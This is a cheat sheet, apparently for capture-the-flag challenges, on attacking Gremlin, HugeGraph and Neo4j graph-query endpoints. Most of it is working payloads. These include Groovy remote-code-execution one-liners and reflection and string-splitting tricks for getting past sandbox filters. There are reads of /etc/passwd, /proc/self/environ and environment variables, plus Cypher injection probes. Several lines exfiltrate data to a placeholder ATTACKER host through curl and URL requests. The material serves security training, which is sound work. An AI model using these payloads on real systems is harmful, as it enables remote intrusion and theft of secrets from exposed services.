# Graph Query

## Gremlin

When the app exposes Gremlin/Groovy traversal input, start with normal graph reads. Gremlin is often exposed by TinkerPop, JanusGraph, Neptune, and HugeGraph-style services.

Endpoint / body shapes:

```bash
curl -s http://HOST/gremlin -H 'content-type: application/json' -d '{"gremlin":"g.V().limit(1).toList()"}'
curl -s http://HOST/gremlin -H 'content-type: application/json' -d '{"language":"gremlin-groovy","gremlin":"g.V().limit(1).toList()"}'
curl -s http://HOST/graphs/hugegraph/gremlin -H 'content-type: application/json' -d '{"gremlin":"g.V().limit(1).toList()"}'
curl -s http://HOST/gremlin -H 'Authorization: Bearer TOKEN' -H 'content-type: application/json' -d '{"gremlin":"g.V().count()"}'
```

Basic reads:

```groovy
g.V().limit(5).toList()
g.V().valueMap(true).toList()
g.V().hasLabel('service').valueMap('name','tier').toList()
g.E().valueMap(true).toList()
g.V().label().dedup().toList()
g.E().label().dedup().toList()
g.V().properties().key().dedup().toList()
g.V().project('id','label','props').by(id()).by(label()).by(valueMap()).limit(20).toList()
g.E().project('id','label','out','in','props').by(id()).by(label()).by(outV().id()).by(inV().id()).by(valueMap()).limit(20).toList()
```

Find flag-like data:

```groovy
g.V().has('flag').valueMap(true).toList()
g.V().has('name', containing('flag')).valueMap(true).toList()
g.V().has('value', containing('flag')).valueMap(true).toList()
g.V().or(has('name', containing('flag')), has('key', containing('flag')), has('value', containing('flag'))).valueMap(true).toList()
g.V().valueMap(true).toList().findAll{ it.toString().toLowerCase().contains('flag') }
g.E().valueMap(true).toList().findAll{ it.toString().toLowerCase().contains('flag') }
```

Path traversal:

```groovy
g.V().hasLabel('user').valueMap(true).toList()
g.V().has('username','admin').out().path().by(valueMap(true)).limit(10).toList()
g.V().has('username','admin').repeat(out()).times(2).path().by(valueMap(true)).limit(20).toList()
g.V().has('username','admin').bothE().otherV().path().by(valueMap(true)).limit(20).toList()
g.V().has('role','admin').both().dedup().valueMap(true).toList()
```

## Gremlin Groovy RCE

```groovy
"id".execute().text
"cat /flag*".execute().text
["bash","-c","id"].execute().text
["bash","-c","cat /flag*"].execute().text
new ProcessBuilder("bash","-c","id").start().getInputStream().text
new ProcessBuilder(["bash","-c","cat /flag*"]).start().getInputStream().text
java.lang.Runtime.getRuntime().exec("id").getInputStream().text
java.lang.Runtime.getRuntime().exec(["bash","-c","id"] as String[]).getInputStream().text
```

HTTP callback:

```groovy
"curl http://ATTACKER/$(whoami)".execute().text
["bash","-c","cat /flag* | base64 -w0 | xargs -I{} curl http://ATTACKER/{}"].execute().text
new URL("http://ATTACKER/ping").text
```

## Reflection Bypass

Use when direct `Runtime`, `ProcessBuilder`, or `execute` strings are blocked.

```groovy
def c = Class.forName("java.lang.ProcessBuilder")
def ctor = c.getConstructor(java.util.List.class)
def pb = ctor.newInstance(["bash","-c","id"])
pb.start().getInputStream().text
```

Runtime by reflection:

```groovy
def c = Class.forName("java.lang.Runtime")
def r = c.getMethod("getRuntime").invoke(null)
def p = c.getMethod("exec", String.class).invoke(r, "id")
p.getInputStream().text
```

If method names are filtered, split strings:

```groovy
def n = "for" + "Name"
def c = Class."$n"("java.lang.ProcessBuilder")
def m = "get" + "Method"
def s = "st" + "art"
```

No direct class names:

```groovy
def cn = ["java","lang","ProcessBuilder"].join(".")
def c = Class.forName(cn)
def pb = c.getConstructor(java.util.List.class).newInstance(["bash","-c","id"])
pb.start().getInputStream().text
```

Use Groovy metaClass:

```groovy
"x".metaClass
this.class.classLoader.loadClass("java.lang.Runtime").getRuntime().exec("id").getInputStream().text
Thread.currentThread().contextClassLoader.loadClass("java.lang.Runtime").getRuntime().exec("id").getInputStream().text
```

## File Read

```groovy
new File("/etc/passwd").text
new File("/flag.txt").text
new File("/").list().toList()
new File(".").canonicalPath
new File("/proc/self/environ").text
new File("/proc/self/cmdline").text
new File("/app").listFiles().collect{it.path}
this.class.protectionDomain.codeSource.location
this.class.classLoader.getResource("").text
```

## Java / Groovy Introspection

```groovy
System.getProperty("user.dir")
System.getProperty("java.version")
System.getenv()
System.getenv("FLAG")
Thread.currentThread()
Thread.currentThread().getContextClassLoader()
this.class
this.class.classLoader
this.binding.variables
```

Loaded classes and classpath:

```groovy
System.getProperty("java.class.path")
this.class.protectionDomain.codeSource.location
Thread.currentThread().contextClassLoader.getURLs().toList()
```

## Sandbox / Filter Bypass

String construction:

```groovy
def u = "ja" + "va.lang.Ru" + "ntime"
def m = "ex" + "ec"
Class.forName(u).getRuntime()."$m"("id").getInputStream().text
```

Unicode / char construction:

```groovy
def cmd = [105,100].collect{(char)it}.join()
cmd.execute().text
def cls = [106,97,118,97,46,108,97,110,103,46,82,117,110,116,105,109,101].collect{(char)it}.join()
Class.forName(cls).getRuntime().exec(cmd).getInputStream().text
```

Closure / collect variants:

```groovy
["id"].collect{ it.execute().text }[0]
["bash","-c","id"].with{ new ProcessBuilder(it).start().getInputStream().text }
```

If `execute` is blocked but file read works:

```groovy
new File("/flag.txt").text
new File("/proc/self/environ").text
new File("/proc/self/cmdline").text
```

If output is hidden:

```groovy
["bash","-c","sleep 5"].execute().waitFor()
["bash","-c","curl http://ATTACKER/$(id|base64 -w0)"].execute().waitFor()
new URL("http://ATTACKER/" + URLEncoder.encode(new File("/flag.txt").text, "UTF-8")).text
```

## HugeGraph Notes

HugeGraph-style endpoints often accept JSON with a `gremlin` field and may expose `language:"gremlin-groovy"`.

```json
{"gremlin":"g.V().limit(1).toList()"}
{"language":"gremlin-groovy","gremlin":"\"id\".execute().text"}
```

For older vulnerable HugeGraph challenges, weak sandboxing around Gremlin/Groovy can turn reflection into RCE. If direct process APIs are blocked, try reflection, string construction, and classloader routes above.

## Cypher / Neo4j

Use when the graph backend is Neo4j/Cypher instead of Gremlin.

```cypher
MATCH (n) RETURN n LIMIT 5
MATCH (n) RETURN labels(n), keys(n), n LIMIT 20
MATCH (n)-[r]->(m) RETURN n,r,m LIMIT 20
MATCH (n) WHERE toString(n) CONTAINS 'flag' RETURN n
MATCH (u:User) RETURN u.username,u.password,u.role
```

Cypher injection probes:

```text
' RETURN 1 AS x //
' OR 1=1 RETURN n //
' WITH 1 AS x MATCH (n) RETURN n //
```

## References

* [Apache TinkerPop Gremlin Applications](https://github.com/apache/tinkerpop/blob/master/docs/src/reference/gremlin-applications.asciidoc)
* [Practical Gremlin](https://www.kelvinlawrence.net/book/PracticalGremlin.html)
* [SecureLayer7: CVE-2024-27348 Apache HugeGraph Gremlin RCE analysis](https://blog.securelayer7.net/remote-code-execution-in-apache-hugegraph/)
